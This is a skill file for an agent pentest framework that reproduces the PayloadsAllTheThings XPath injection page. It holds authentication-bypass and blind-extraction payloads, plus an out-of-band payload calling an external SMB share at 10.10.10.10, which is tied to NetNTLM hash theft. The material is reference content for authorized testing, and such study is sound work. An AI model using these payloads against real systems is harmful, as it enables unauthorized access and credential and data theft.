---
name: payloads-xpath
description: "XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Automate XPath injection attacks to retrieve documents Advanced XPath Injection Tool A fork of xxxpwn using predictive text Xpath injection exploitation tool Similar to SQL injection, you want to terminate the query..."
---

# XPath Injection Payloads

> **Source:** [PayloadsAllTheThings/XPATH Injection](https://github.com/swisskyrepo/payloadsallthethings/tree/master/XPATH%20Injection)
> **Category:** `payloads-injection` | **Skill ID:** `payloads-xpath`

## Overview

XPath injection payloads for XML database authentication bypass and data extraction.

This skill integrates the full **PayloadsAllTheThings** (PATT) payload library for the **XPath Injection Payloads** domain into the REA_Skill framework. Use it during authorized penetration testing, bug bounty research, security audits, and CTF challenges.

## Workflow

### 1. Recon & Identification
- Identify the target technology stack and injection points
- Enumerate endpoints, parameters, and input vectors
- Determine applicable payload categories from the reference below

### 2. Payload Selection
- Browse the PATT payload library for the attack class
- Select encoding-appropriate payloads for the target environment
- Consider WAF bypass variants and obfuscation techniques

### 3. Exploitation (Authorized Only)
- Test payloads in order: passive → active → escalation
- Document every payload tested and its response
- Capture PoC evidence (screenshots, HTTP logs, curl output)

### 4. Verification & Reporting
- Confirm the vulnerability with a clean minimal PoC
- Map findings to CVE/CWE where applicable
- Report with remediation recommendations and code fixes

---

## Full PATT Reference

# XPATH Injection

> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Blind Exploitation](#blind-exploitation)
    * [Out Of Band Exploitation](#out-of-band-exploitation)
* [Labs](#labs)
* [References](#references)

## Tools

* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool

## Methodology

Similar to SQL injection, you want to terminate the query properly:

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### Blind Exploitation

1. Size of a string

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. Access a character with `substring`, and verify its value the `codepoints-to-string` function

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### Out Of Band Exploitation

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## Labs

* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## References

* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://web.archive.org/web/20170325082934/http://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPATH Injection - OWASP - January 21, 2015](https://web.archive.org/web/20240217030110/http://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))

---

## REA MCP Integration

```javascript
// REA MCP — Automated payload injection via REA tools
// Use analyze_function, procedure_pseudo_code, or observe_native_calls
// to identify injection sinks, then apply payloads from this skill.
```

## Legal Notice

> ⚠️ **Authorized Use Only.** All payloads in this skill are for security research, penetration testing with written permission, CTF competitions, and defensive study. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
